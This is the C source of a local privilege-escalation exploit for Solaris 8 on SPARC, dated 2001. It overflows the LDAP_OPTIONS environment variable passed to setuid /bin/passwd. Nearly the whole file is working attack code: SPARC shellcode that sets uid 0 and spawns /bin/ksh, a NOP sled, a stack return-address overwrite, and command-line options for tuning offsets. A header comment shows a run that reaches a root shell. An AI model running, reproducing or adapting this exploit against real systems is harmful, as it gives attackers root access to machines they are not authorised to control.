#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>


/* $Id: ldap_exp2.c,v 1.1 2001/06/27 23:01:04 fygrave Exp $
 *
 * victim% ./lod -s 316 -p 5
 * jumping into: ffbefe74 (buf size: 156, soff: 316, stack: ffbefd38)
 * # id
 * uid=0(root) gid=200(em) egid=3(sys)
 * # uname -a
 * SunOS victim 5.8 Generic_108528-06 sun4u sparc SUNW,Ultra-60
 * # ^D
 * victim%
 * Thu Jun 28 05:22:38 ICT 2001
 * Fyodor <fygrave@tigerteam.net>
 */

#define NOP "\x80\x1c\x40\x11"
#define BUFSIZE 156
#define LOCALBUF 10000
#define NOPS     1964
#define PAD 3
#define SOFF 664

char shellcode[]=

"\x90\x1a\x40\x09"  /*  xor  %o1, %o1, %o0 */
"\x82\x10\x20\x17"  /*  mov  0x17, %g1 */
"\x91\xd0\x20\x08"  /*  ta  8 */
"\x20\xbf\xff\xff"  /*  bn,a   0x108b4 <main+8> */
"\x20\xbf\xff\xff"  /*  bn,a   0x108b8 <maino> */
"\x7f\xff\xff\xff"  /*  call  0x108bc <shellcode> */
"\x90\x03\xe0\x30"  /*  add  %o7, 0x30, %o0 */
"\x92\x03\xe0\x28"  /*  add  %o7, 0x28, %o1 */
"\xc0\x2b\xe0\x38"  /*  clrb  [ %o7 + 0x38 ] */
"\xd0\x23\xe0\x28"  /*  st  %o0, [ %o7 + 0x28 ] */
"\xc0\x23\xe0\x2c"  /*  clr  [ %o7 + 0x2c ] */
"\x82\x10\x20\x0b"  /*  mov  0xb, %g1 */
"\x91\xd0\x20\x08"  /*  ta  8 */
"\x82\x10\x20\x01"  /*  mov  1, %g1 */
"\x91\xd0\x20\x08"  /*  ta  8 */
"\x41\x41\x41\x41"  /*  AAAA */
"\x41\x41\x41\x41"  /*  AAAA */
"\x2f\x62\x69\x6e"  /*  /bin */
"\x2f\x6b\x73\x68"  /*  /ksh */
"\x41\x57\x68\x6f";  /*  junk */

extern char *optarg;

unsigned long get_sp(void) {

   __asm__("mov %sp,%i0 \n");

}

int main(int argc, char **argv) {

    static    char buf[LOCALBUF], *ptr;
    unsigned long addr, bufsize, soff, pad;
    int i, c;

    soff = SOFF;
    bufsize = BUFSIZE;
    pad = PAD;

    while((c = getopt(argc, argv, "s:b:p:h")) !=EOF) 
        switch(c) {
            case 'b':
                bufsize = strtoul(optarg,NULL,0); 
                break;
            case 's':
                soff = strtoul(optarg,NULL,0); 
                break;
            case 'p':
                pad = strtoul(optarg,NULL,0);
                break;    
            case 'h':
            default:
                fprintf(stderr,"usage: %s [-b buffsize] [-s stackoff] [-p pad]\n",
                argv[0]);
                exit(1);
        }
	
    
    bzero(buf, sizeof(buf));

    strcpy(buf,"LDAP_OPTIONS=");
    ptr=buf + strlen(buf);
    
    for(i=0;i<bufsize;i++, ptr++) *ptr='A';

    addr = get_sp() + soff;
    memcpy(ptr,(char *)&addr, 4);
    memcpy(ptr+4,(char *)&addr, 4);
    ptr+=8;

    for(i=0;i<pad;i++, ptr++) *ptr='A';
    for(i=0;i<NOPS;i++, ptr+=4) memcpy(ptr, NOP, 4);
    strcat(buf, shellcode);

    putenv(buf);
    fprintf(stderr,"jumping into: %lx (buf size: %i, soff: %i, stack: %lx)\n",
        addr, bufsize, soff, get_sp());

    execl("/bin/passwd","lameswd",0);
}
